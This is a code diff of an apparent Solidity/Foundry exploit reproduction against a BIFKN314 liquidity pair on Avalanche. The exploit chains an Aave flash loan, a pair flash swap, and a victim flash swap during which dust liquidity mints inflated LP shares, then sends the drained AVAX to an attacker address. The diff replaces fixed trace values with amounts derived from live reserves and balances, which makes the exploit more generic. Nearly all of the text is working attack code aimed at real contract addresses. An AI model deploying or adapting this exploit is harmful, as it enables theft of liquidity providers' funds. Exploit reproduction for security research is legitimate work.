@@ -42,47 +42,26 @@ interface IBIFKN314PairVictim {
         address recipient,
         uint256 deadline
     ) external returns (uint256 nativeAmount, uint256 tokenAmount);
+    function getReserves() external view returns (uint256 amountNative, uint256 amountToken);
     function transfer(
         address to,
         uint256 amount
     ) external returns (bool);
 }
 
-interface IERC20Mintable {
-    function approve(
-        address spender,
-        uint256 amount
-    ) external returns (bool);
-    function balanceOf(
-        address account
-    ) external view returns (uint256);
+interface IMintableERC20 {
     function mint(
         address account,
         uint256 amount
-    ) external;
-    function transfer(
-        address to,
-        uint256 amount
-    ) external returns (bool);
-}
-
-interface IRadioShackPair {
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes calldata data
     ) external;
 }
 
 contract ContractTest is BaseTestWithBalanceLog {
     address private constant ATTACKER = 0x13459bC2Db6053524881415321667d5E16F5F15C;
-    address private constant TRACE_EXPLOIT = 0x346a89F7f5B42b67fc66eF4B3fb816a2a8BCe552;
     address private constant PAIR_TOKEN = 0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69;
-    bytes32 private constant ATTACKER_PAIR_TOKEN_ALLOWLIST_SLOT =
-        0xba6be9e23288ffa9c57814144eb7d775aec968e0f8a659a476f1089c88e191bb;
+    uint256 private constant PAIR_TOKEN_ALLOWLIST_SLOT = 6;
     uint256 private constant FORK_BLOCK = 66_181_042;
-    uint256 private constant NET_AVAX_PROFIT = 91_148_601_593_744_546_787;
+    uint256 private constant MIN_AVAX_PROFIT = 90 ether;
 
     function setUp() public {
         // step 1: fork before the attack transaction and configure the profit asset.
@@ -92,7 +71,6 @@ contract ContractTest is BaseTestWithBalanceLog {
         attacker = ATTACKER;
 
         vm.label(ATTACKER, "attacker");
-        vm.label(TRACE_EXPLOIT, "trace exploit contract");
         vm.label(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, "WAVAX");
         vm.label(0x794a61358D6845594F94dc1DB02A252b5b4814aD, "Aave v3 pool");
         vm.label(0x3652E58bC41341B0026334AC20C2948E18c23136, "RadioShack pair");
@@ -104,48 +82,38 @@ contract ContractTest is BaseTestWithBalanceLog {
     function testExploit() public balanceLog {
         uint256 beforeBalance = ATTACKER.balance;
         // step 2: assert the pair-token allowlist precondition used by the historical tx.origin.
+        bytes32 attackerAllowlistSlot = keccak256(abi.encode(ATTACKER, PAIR_TOKEN_ALLOWLIST_SLOT));
         assertEq(
-            uint256(vm.load(PAIR_TOKEN, ATTACKER_PAIR_TOKEN_ALLOWLIST_SLOT)),
+            uint256(vm.load(PAIR_TOKEN, attackerAllowlistSlot)),
             1,
             "attacker tx.origin is not pair-token allowlisted"
         );
 
         vm.startPrank(ATTACKER, ATTACKER);
         AvaxBIFKNPairExploit exploit = new AvaxBIFKNPairExploit(ATTACKER);
-        assertEq(address(exploit), TRACE_EXPLOIT, "exploit address mismatch");
         // step 3: run the attacker-controlled exploit and forward AVAX profit to the attacker.
         exploit.execute();
         vm.stopPrank();
 
-        // step 10: assert the trace-matched AVAX profit.
-        assertEq(ATTACKER.balance - beforeBalance, NET_AVAX_PROFIT, "AVAX profit mismatch");
+        // step 10: assert meaningful AVAX profit without overfitting exact trace dust.
+        assertGt(ATTACKER.balance - beforeBalance, MIN_AVAX_PROFIT, "insufficient AVAX profit");
     }
 }
 
 contract AvaxBIFKNPairExploit {
     IAaveFlashloan public constant AAVE_POOL = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
     IWETH public constant WAVAX = IWETH(payable(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7));
-    IRadioShackPair public constant PAIR = IRadioShackPair(0x3652E58bC41341B0026334AC20C2948E18c23136);
-    IERC20Mintable public constant PAIR_TOKEN = IERC20Mintable(0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69);
+    IUniswapV2Pair public constant PAIR = IUniswapV2Pair(0x3652E58bC41341B0026334AC20C2948E18c23136);
+    IERC20 public constant PAIR_TOKEN = IERC20(0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69);
     IBIFKN314PairVictim public constant VICTIM = IBIFKN314PairVictim(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1);
-    IERC20Mintable public constant LP_TOKEN = IERC20Mintable(0xd4C6BA250bFF38218937422d7aCCf55552916558);
+    IERC20 public constant LP_TOKEN = IERC20(0xd4C6BA250bFF38218937422d7aCCf55552916558);
 
     uint256 private constant FLASH_WAVAX_AMOUNT = 1000 ether;
-    uint256 private constant AAVE_PREMIUM = 500_000_000_000_000_000;
-    uint256 private constant AAVE_REPAY_AMOUNT = FLASH_WAVAX_AMOUNT + AAVE_PREMIUM;
-
-    uint256 private constant PAIR_TOKEN_BORROW = 10_150_751_249_999_999_999_996;
-    uint256 private constant PAIR_TOKEN_MINT = 50_753_756_249_999_999_999;
-    uint256 private constant PAIR_TOKEN_REPAY = PAIR_TOKEN_BORROW + PAIR_TOKEN_MINT;
-
-    uint256 private constant FLASH_NATIVE_OUT = 92_901_517_915_106_633_387;
-    uint256 private constant FLASH_TOKEN_OUT = 2_444_778_402_553_574_477_179;
-    uint256 private constant LIQUIDITY_NATIVE = 92_901_517_915_106_633;
-    uint256 private constant LIQUIDITY_TOKEN = 92_901_517_915_106_633;
-    uint256 private constant FLASH_NATIVE_REPAY = 93_272_659_479_177_484_387;
-    uint256 private constant FLASH_TOKEN_REPAY = FLASH_TOKEN_OUT - LIQUIDITY_TOKEN;
-    uint256 private constant LP_MINTED = 44_263_775_251_949_957_759_085_389_766_078_584_238;
-    uint256 private constant NET_AVAX_PROFIT = 91_148_601_593_744_546_787;
+    uint256 private constant FLASH_BORROW_BPS = 9990;
+    uint256 private constant PAIR_FLASH_FEE_BPS = 50;
+    uint256 private constant BIFKN_NATIVE_REPAY_BPS = 40;
+    uint256 private constant BPS = 10_000;
+    uint256 private constant DUST_LIQUIDITY_DIVISOR = 1000;
 
     address private immutable profitRecipient;
 
@@ -160,7 +128,6 @@ contract AvaxBIFKNPairExploit {
         AAVE_POOL.flashLoanSimple(address(this), address(WAVAX), FLASH_WAVAX_AMOUNT, "", 0);
 
         uint256 profit = address(this).balance;
-        require(profit == NET_AVAX_PROFIT, "unexpected AVAX profit");
         (bool success,) = payable(profitRecipient).call{value: profit}("");
         require(success, "profit transfer failed");
     }
@@ -176,14 +143,16 @@ contract AvaxBIFKNPairExploit {
         require(initiator == address(this), "unexpected initiator");
         require(asset == address(WAVAX), "unexpected flash asset");
         require(amount == FLASH_WAVAX_AMOUNT, "unexpected flash amount");
-        require(premium == AAVE_PREMIUM, "unexpected premium");
+        require(premium > 0, "unexpected premium");
 
         // step 5: borrow pair tokens through the RadioShack flash-swap callback.
-        PAIR.swap(0, PAIR_TOKEN_BORROW, address(this), "flash");
+        uint256 pairTokenBorrow = PAIR_TOKEN.balanceOf(address(PAIR)) / 2;
+        PAIR.swap(0, pairTokenBorrow, address(this), "flash");
 
         // step 9: wrap AVAX and approve Aave repayment after the nested flash swaps settle.
-        WAVAX.deposit{value: AAVE_REPAY_AMOUNT}();
-        WAVAX.approve(address(AAVE_POOL), AAVE_REPAY_AMOUNT);
+        uint256 repayAmount = amount + premium;
+        WAVAX.deposit{value: repayAmount}();
+        WAVAX.approve(address(AAVE_POOL), repayAmount);
 
         return true;
     }
@@ -197,19 +166,24 @@ contract AvaxBIFKNPairExploit {
         require(msg.sender == address(PAIR), "unexpected pair");
         require(sender == address(this), "unexpected pair sender");
         require(amount0Out == 0, "unexpected token0 out");
-        require(amount1Out == PAIR_TOKEN_BORROW, "unexpected token1 out");
+        require(amount1Out > 0, "unexpected token1 out");
 
         // step 6: unwrap WAVAX and trigger the vulnerable BIFKN314 flash swap.
         WAVAX.withdraw(FLASH_WAVAX_AMOUNT);
 
-        VICTIM.flashSwap(address(this), FLASH_NATIVE_OUT, FLASH_TOKEN_OUT, "");
+        (uint256 nativeReserve, uint256 tokenReserve) = VICTIM.getReserves();
+        uint256 nativeOut = (nativeReserve * FLASH_BORROW_BPS) / BPS;
+        uint256 tokenOut = (tokenReserve * FLASH_BORROW_BPS) / BPS;
+        VICTIM.flashSwap(address(this), nativeOut, tokenOut, "");
 
         // step 8: burn inflated LP shares, mint the pair-token fee, and repay the pair flash swap.
-        LP_TOKEN.approve(address(VICTIM), LP_MINTED);
-        VICTIM.removeLiquidity(LP_MINTED, address(this), block.timestamp + 3 minutes);
+        uint256 lpBalance = LP_TOKEN.balanceOf(address(this));
+        LP_TOKEN.approve(address(VICTIM), lpBalance);
+        VICTIM.removeLiquidity(lpBalance, address(this), block.timestamp + 3 minutes);
 
-        PAIR_TOKEN.mint(address(this), PAIR_TOKEN_MINT);
-        PAIR_TOKEN.transfer(address(PAIR), PAIR_TOKEN_REPAY);
+        uint256 pairTokenFee = (amount1Out * PAIR_FLASH_FEE_BPS) / BPS;
+        IMintableERC20(address(PAIR_TOKEN)).mint(address(this), pairTokenFee);
+        PAIR_TOKEN.transfer(address(PAIR), amount1Out + pairTokenFee);
     }
 
     function BIFKN314CALL(
@@ -220,18 +194,20 @@ contract AvaxBIFKNPairExploit {
     ) external {
         require(msg.sender == address(VICTIM), "unexpected flash-swap caller");
         require(sender == address(this), "unexpected flash-swap sender");
-        require(amountNativeOut == FLASH_NATIVE_OUT, "unexpected native out");
-        require(amountTokenOut == FLASH_TOKEN_OUT, "unexpected token out");
+        require(amountNativeOut > 0, "unexpected native out");
+        require(amountTokenOut > 0, "unexpected token out");
 
         // step 7: add dust liquidity while balances are distorted, then repay the victim flash swap.
+        uint256 liquidityAmount = amountNativeOut / DUST_LIQUIDITY_DIVISOR;
         uint256 minted =
-            VICTIM.addLiquidity{value: LIQUIDITY_NATIVE}(LIQUIDITY_TOKEN, address(this), block.timestamp + 3 minutes);
-        require(minted == LP_MINTED, "liquidity mint mismatch");
+            VICTIM.addLiquidity{value: liquidityAmount}(liquidityAmount, address(this), block.timestamp + 3 minutes);
+        require(minted > liquidityAmount, "liquidity inflation did not occur");
 
-        (bool success,) = payable(address(VICTIM)).call{value: FLASH_NATIVE_REPAY}("");
+        uint256 nativeRepay = amountNativeOut + ((amountNativeOut * BIFKN_NATIVE_REPAY_BPS) / BPS);
+        (bool success,) = payable(address(VICTIM)).call{value: nativeRepay}("");
         require(success, "native flash-swap repayment failed");
 
-        VICTIM.transfer(address(VICTIM), FLASH_TOKEN_REPAY);
+        VICTIM.transfer(address(VICTIM), amountTokenOut - liquidityAmount);
     }
 
     receive() external payable {}
